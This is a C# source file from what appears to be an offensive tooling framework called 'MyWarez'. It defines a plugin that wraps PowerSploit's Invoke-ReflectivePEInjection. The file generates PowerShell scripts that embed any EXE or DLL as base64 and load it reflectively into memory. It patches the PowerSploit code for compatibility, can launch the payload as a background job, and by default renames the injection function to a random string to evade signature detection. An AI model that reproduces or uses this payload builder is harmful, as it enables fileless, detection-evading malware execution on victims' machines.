using MyWarez.Core;
using System;
using System.IO;

namespace MyWarez.Plugins.PowerSploit
{
    internal static class Constants
    {
        public static readonly string PowerSploitDirectory = Path.Join(Core.Constants.PluginsResourceDirectory, "PowerSploit", "PowerSploit");
    }

    public class InvokeReflectionPEInjection : PowerShellScript
    {
        public InvokeReflectionPEInjection(IPortableExecutable PE,
                                           string FunctionName = null,
                                           string ExeArgs = null,
                                           string ProcName = null,
                                           bool DoNotZeroMZ = false,
                                           bool ForceASLR = false,
                                           bool ImportScript = true, // Useful if you want to save space when merging multiple InvokeReflectionPEInjection scripts. (If this is disabled then you're restricted to 1 FunctionName for all DLLs to run)
                                           bool StartJob = false, // run Invoke-ReflectionPEInjection as a PowerShell job (starts a new Powershell child proess). Needed for running (multiple) DLLs since the process seems to crash after execution?. Start-ThreadJob would be a better option for updated versions of PowerShell..
                                           bool RenameFunction = true) // Replaces the function name "Invoke-ReflectionPEInjection" with a random name
        {
            if (!(PE.Type == PortableExecutableType.Exe || PE.Type == PortableExecutableType.Dll))
                throw new ArgumentException("Invalid PortableExecutable type");
            this.PE = PE;
            this.FunctionName = FunctionName;
            this.ExeArgs = ExeArgs;
            this.ProcName = ProcName;
            this.DoNotZeroMZ = DoNotZeroMZ;
            this.ForceASLR = ForceASLR;
            this.ImportScript = ImportScript;
            this.StartJob = StartJob;
            this.RenameFunction = RenameFunction;
        }

        private IPortableExecutable PE { get; }
        private string FunctionName { get; }
        private string ExeArgs { get; }
        private string ProcName { get; }
        private bool DoNotZeroMZ { get; }
        private bool ForceASLR { get; }
        private bool ImportScript { get; }
        private bool StartJob { get; }
        private bool RenameFunction { get; }

        public override string Text
        {
            get
            {
                var peBytes = PE.Bytes;
                var peBytesBase64 = Convert.ToBase64String(peBytes);
                var PowerSploitScriptContent = File.ReadAllText(PowerSploitScriptFilePath);
                PowerSploitScriptContent = PowerSploitScriptContent.Replace("$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')", "$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))"); // https://github.com/PowerShellMafia/PowerSploit/pull/289
                if (!ImportScript)
                    PowerSploitScriptContent = "";
                if (FunctionName != null)
                    PowerSploitScriptContent = PowerSploitScriptContent.Replace(VoidFuncDefaultName, FunctionName);
                var commandAdditionalArgs = "";
                if (PE.Type == PortableExecutableType.Exe && ExeArgs != null)
                    commandAdditionalArgs += " -ExeArgs " + ExeArgs;
                if (ProcName != null)
                    commandAdditionalArgs += " -ProcName " + ProcName;
                if (DoNotZeroMZ)
                    commandAdditionalArgs += " -DoNotZeroMZ";
                if (ForceASLR)
                    commandAdditionalArgs += " -ForceASLR";

                var command = string.Format("Invoke-ReflectivePEInjection -PEBytes $PEBytes{0}", commandAdditionalArgs);
                var randId = Utils.RandomString(10);
                var scriptBlock = "$sb" + randId + " = {\r\n" + string.Format(template, peBytesBase64, PowerSploitScriptContent, command) + "\r\n}";

                var outputScript = scriptBlock + "\r\n";
                if (StartJob)
                    outputScript += string.Format("Start-Job -scriptblock $sb{0} | Wait-Job", randId);
                else
                    outputScript += string.Format("& $sb{0}", randId);
                outputScript += "\r\n";

                if (RenameFunction)
                    outputScript = outputScript.Replace("Invoke-ReflectivePEInjection", "F" + Utils.RandomString(10));

                return outputScript;
            }
        }

        private string template = @"$InputString='{0}'
{1}
$PEBytes = [System.Convert]::FromBase64String($InputString)
{2}
";

        private static string VoidFuncDefaultName = "VoidFunc";
        private static string PowerSploitScriptFilePath = Constants.PowerSploitDirectory + "CodeExecution" + Path.DirectorySeparatorChar + "Invoke-ReflectivePEInjection.ps1";
    }
}